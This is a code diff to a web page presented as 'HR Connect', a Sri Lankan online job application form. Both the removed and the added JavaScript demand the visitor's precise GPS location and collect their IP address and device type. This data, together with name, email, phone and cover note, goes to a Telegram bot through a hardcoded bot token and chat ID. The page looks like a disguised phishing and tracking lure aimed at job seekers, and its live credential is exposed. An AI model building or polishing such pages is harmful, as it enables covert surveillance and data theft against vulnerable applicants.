@@ -46,51 +46,7 @@
       padding-bottom: 16px;
     }
 
-    /* ===== START BUTTON ===== */
-    #start-section {
-      text-align: center;
-      margin-bottom: 24px;
-    }
-
-    #start-btn {
-      background: #2a7de1;
-      color: #fff;
-      border: none;
-      padding: 14px 40px;
-      font-size: 18px;
-      font-weight: 600;
-      border-radius: 40px;
-      cursor: pointer;
-      transition: 0.25s;
-      box-shadow: 0 4px 14px rgba(42, 125, 225, 0.3);
-    }
-
-    #start-btn:hover {
-      background: #1a6ac8;
-      transform: scale(1.02);
-    }
-
-    #start-btn:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    /* ===== SUCCESS BANNER ===== */
-    #success-banner {
-      display: none;
-      background: #d4edda;
-      border-radius: 12px;
-      padding: 14px 18px;
-      margin-bottom: 18px;
-      border-left: 4px solid #28a745;
-      color: #155724;
-      font-size: 15px;
-      font-weight: 600;
-      text-align: center;
-    }
-
-    /* ===== LOCATION STATUS ===== */
+    /* LOCATION STATUS */
     #location-status {
       background: #f0f7ff;
       border-radius: 12px;
@@ -108,11 +64,7 @@
       font-size: 20px;
     }
 
-    #location-status .text {
-      flex: 1;
-    }
-
-    /* ===== FORM ===== */
+    /* FORM */
     .form-group {
       margin-bottom: 18px;
     }
@@ -152,7 +104,7 @@
       min-height: 70px;
     }
 
-    /* ===== SUBMIT ===== */
+    /* SUBMIT */
     .btn-submit {
       width: 100%;
       background: #2a7de1;
@@ -189,32 +141,17 @@
 <body>
 
 <div class="card">
-
   <div class="logo">📋 HR Connect</div>
   <div class="sub-logo">Online Job Application · Sri Lanka</div>
 
-  <!-- ===== START BUTTON ===== -->
-  <div id="start-section">
-    <button id="start-btn">📍 Start Application</button>
-    <p style="font-size: 13px; color: #888; margin-top: 6px;">
-      Click to allow Location access
-    </p>
-  </div>
-
-  <!-- ===== SUCCESS BANNER ===== -->
-  <div id="success-banner">
-    ✅ Location Granted - You are eligible to apply!
-  </div>
-
-  <!-- ===== LOCATION STATUS ===== -->
+  <!-- LOCATION STATUS -->
   <div id="location-status">
     <span class="icon">📍</span>
-    <span class="text" id="locationText">⏳ Waiting for permission...</span>
+    <span class="text" id="locationText">Location access is required to verify your application area.</span>
   </div>
 
-  <!-- ===== APPLICATION FORM ===== -->
+  <!-- APPLICATION FORM -->
   <form id="applicationForm">
-
     <div class="form-group">
       <label>Full Name</label>
       <input type="text" id="fullName" placeholder="e.g. Kaveesha Perera" required />
@@ -232,7 +169,7 @@
 
     <div class="form-group">
       <label>Position Applying For</label>
-      <select id="position">
+      <select id="position" required>
         <option value="">— Select —</option>
         <option value="Software Engineer">Software Engineer</option>
         <option value="UI/UX Designer">UI/UX Designer</option>
@@ -248,246 +185,123 @@
     </div>
 
     <button type="submit" class="btn-submit" id="submitBtn">🚀 Submit Application</button>
-
   </form>
-
 </div>
 
-<!-- ============================================================ -->
-<!-- ===== JAVASCRIPT - LOCATION ONLY ===== -->
-<!-- ============================================================ -->
 <script>
-  // =============================================
-  // 🔐 TELEGRAM CONFIG
-  // =============================================
+  // ⚠️ WARNING: Exposing Tokens in client-side code is unsafe for production environments.
   const BOT_TOKEN = '8864995146:AAERB2czzLwxRORXAHcFieptoqXdCJ7BLec';
   const CHAT_ID   = '8308044531';
 
-  // =============================================
-  // 📍 ELEMENTS
-  // =============================================
-  const startBtn = document.getElementById('start-btn');
+  const form = document.getElementById('applicationForm');
+  const submitBtn = document.getElementById('submitBtn');
   const locationText = document.getElementById('locationText');
-  const locationStatusDiv = document.getElementById('location-status');
-  const successBanner = document.getElementById('success-banner');
-  let userLocation = null;
-  let locationAllowed = false;
-  let watchId = null;
 
-  // =============================================
-  // 🚀 START BUTTON - LOCATION ONLY
-  // =============================================
-  startBtn.addEventListener('click', () => {
-    // Disable button
-    startBtn.disabled = true;
-    startBtn.textContent = '⏳ Requesting location...';
-
-    locationText.textContent = '⏳ Requesting location permission...';
-
-    if (!navigator.geolocation) {
-      locationText.textContent = '❌ Geolocation not supported.';
-      startBtn.disabled = false;
-      startBtn.textContent = '🔄 Retry';
-      return;
-    }
-
-    // Use watchPosition to trigger permission popup
-    watchId = navigator.geolocation.watchPosition(
-      // ✅ Success
-      (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        userLocation = { lat, lon };
-        locationAllowed = true;
-
-        // Show success banner, hide status
-        successBanner.style.display = 'block';
-        locationStatusDiv.style.display = 'none';
-
-        // Send to Telegram
-        sendLocationToTelegram(lat, lon);
-
-        // Update button
-        startBtn.textContent = '✅ Location Granted';
-        startBtn.style.background = '#28a745';
-
-        // Stop watching
-        if (watchId) navigator.geolocation.clearWatch(watchId);
-      },
-      // ❌ Error
-      (err) => {
-        console.warn('Location error:', err);
-        let msg = '❌ Location access denied. Please enable GPS.';
-        if (err.code === 1) {
-          msg = '❌ Permission denied. Allow location in Settings.';
-        } else if (err.code === 2) {
-          msg = '❌ Location unavailable. Check GPS.';
-        } else if (err.code === 3) {
-          msg = '⏳ Location timeout. Please try again.';
-        }
-        locationText.textContent = msg;
-        locationAllowed = false;
-        userLocation = null;
-
-        successBanner.style.display = 'none';
-        locationStatusDiv.style.display = 'flex';
-
-        startBtn.disabled = false;
-        startBtn.textContent = '🔄 Retry';
-        startBtn.style.background = '#dc3545';
-
-        if (watchId) navigator.geolocation.clearWatch(watchId);
-      },
-      // Options
-      {
-        enableHighAccuracy: true,
-        timeout: 15000,
-        maximumAge: 0
+  // Helper function to get Geolocation as a Promise
+  function getCoordinates() {
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) {
+        reject(new Error('Geolocation is not supported by your browser.'));
+      } else {
+        navigator.geolocation.getCurrentPosition(
+          (position) => resolve(position.coords),
+          (error) => reject(error),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
       }
-    );
-  });
+    });
+  }
 
-  // =============================================
-  // 📤 SEND LOCATION TO TELEGRAM
-  // =============================================
-  async function sendLocationToTelegram(lat, lon) {
+  // Helper to fetch IP
+  async function getPublicIP() {
     try {
-      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-      let ip = 'Unknown';
-      try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        ip = ipData.ip || 'Unknown';
-      } catch (e) {}
-
-      const ua = navigator.userAgent;
-      const device = ua.match(/Android|iPhone|iPad|Windows|Mac|Linux/i)?.[0] || 'Unknown Device';
-
-      const msg = `
-📍 NEW LOCATION DETECTED
-
-🌐 IP: ${ip}
-📱 Device: ${device}
-🕐 Time: ${new Date().toLocaleString()}
-
-📍 Coordinates:
-Latitude: ${lat}
-Longitude: ${lon}
-
-🗺️ Google Maps:
-${mapsLink}
-      `;
-
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: msg
-        })
-      });
-
-      console.log('✅ Location sent to Telegram');
-
-    } catch (err) {
-      console.error('Send error:', err);
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || 'Unknown';
+    } catch {
+      return 'Unknown';
     }
   }
 
-  // =============================================
-  // 📝 FORM SUBMIT - Check Location First!
-  // =============================================
-  document.getElementById('applicationForm').addEventListener('submit', async (e) => {
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
+    submitBtn.disabled = true;
+    submitBtn.textContent = '⏳ Requesting Location...';
 
-    const submitBtn = document.getElementById('submitBtn');
-
-    // ===== CHECK: Location allowed? =====
-    if (!locationAllowed) {
-      alert('❌ කරුණාකර මුලින් "Start Application" බොත්තම ඔබලා Location Permission එක Allow කරන්න.');
+    let userCoords = null;
+    
+    // 1. Get Location
+    try {
+      userCoords = await getCoordinates();
+      locationText.textContent = '✅ Location verified!';
+      locationText.style.color = '#28a745';
+    } catch (err) {
+      alert('❌ Location access is required to submit the application. Please allow location permissions in your browser.');
       submitBtn.disabled = false;
       submitBtn.textContent = '🚀 Submit Application';
+      locationText.textContent = '❌ Location access denied. Please enable GPS and allow browser permissions.';
+      locationText.style.color = '#dc3545';
       return;
     }
 
-    // ===== If location allowed, proceed =====
-    submitBtn.disabled = true;
-    submitBtn.textContent = '⏳ Submitting...';
+    // 2. Prepare Data & IP
+    submitBtn.textContent = '⏳ Submitting Application...';
+    const ipAddress = await getPublicIP();
 
-    // Get form values
     const fullName = document.getElementById('fullName').value.trim();
     const email = document.getElementById('email').value.trim();
     const phone = document.getElementById('phone').value.trim();
     const position = document.getElementById('position').value;
     const coverNote = document.getElementById('coverNote').value.trim();
+    const device = navigator.userAgent.match(/Android|iPhone|iPad|Windows|Mac|Linux/i)?.[0] || 'Unknown Device';
 
-    // Validate
-    if (!fullName || !email || !phone) {
-      alert('❌ කරුණාකර Full Name, Email සහ Phone Number පුරවන්න.');
-      submitBtn.disabled = false;
-      submitBtn.textContent = '🚀 Submit Application';
-      return;
-    }
+    const mapsLink = `https://www.google.com/maps?q=${userCoords.latitude},${userCoords.longitude}`;
 
-    // Build message
-    let msg = `
+    const message = `
 📋 NEW JOB APPLICATION
 
 👤 Name: ${fullName}
 📧 Email: ${email}
 📞 Phone: ${phone}
-💼 Position: ${position || 'Not specified'}
+💼 Position: ${position}
 
 📝 Cover Note:
-${coverNote || '—'}
+${coverNote || 'N/A'}
 
-📍 Location: ${userLocation ? `${userLocation.lat}, ${userLocation.lon}` : '❌ Not available'}
+🌐 IP Address: ${ipAddress}
+📱 Device: ${device}
+📍 Latitude: ${userCoords.latitude}
+📍 Longitude: ${userCoords.longitude}
+🗺️ Google Maps: ${mapsLink}
 
 🕐 Submitted: ${new Date().toLocaleString()}
     `;
 
-    if (userLocation) {
-      msg += `\n🗺️ Maps: https://www.google.com/maps?q=${userLocation.lat},${userLocation.lon}`;
-    }
-
+    // 3. Send to Telegram
     try {
       const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: CHAT_ID,
-          text: msg
+          text: message
         })
       });
 
       if (response.ok) {
         submitBtn.textContent = '✅ Application Submitted!';
         submitBtn.style.background = '#28a745';
-        document.getElementById('applicationForm').reset();
-
-        // Reset everything
-        userLocation = null;
-        locationAllowed = false;
-        successBanner.style.display = 'none';
-        locationStatusDiv.style.display = 'flex';
-        startBtn.disabled = false;
-        startBtn.textContent = '🔄 Start Again';
-        startBtn.style.background = '#2a7de1';
-        locationText.textContent = '⏳ Click "Start Again" to re-allow permission...';
+        form.reset();
       } else {
-        submitBtn.textContent = '❌ Submission Failed';
-        submitBtn.disabled = false;
+        throw new Error('Telegram API failure');
       }
-
     } catch (err) {
-      console.error('Submit error:', err);
-      submitBtn.textContent = '❌ Error';
+      console.error(err);
+      alert('❌ Failed to submit. Please check your network connection.');
       submitBtn.disabled = false;
+      submitBtn.textContent = '🚀 Submit Application';
     }
   });
-
-  console.log('✅ HR Connect Form Loaded - Location Only');
-  console.log('📍 Click "Start Application" to request location');
 </script>
 
 </body>
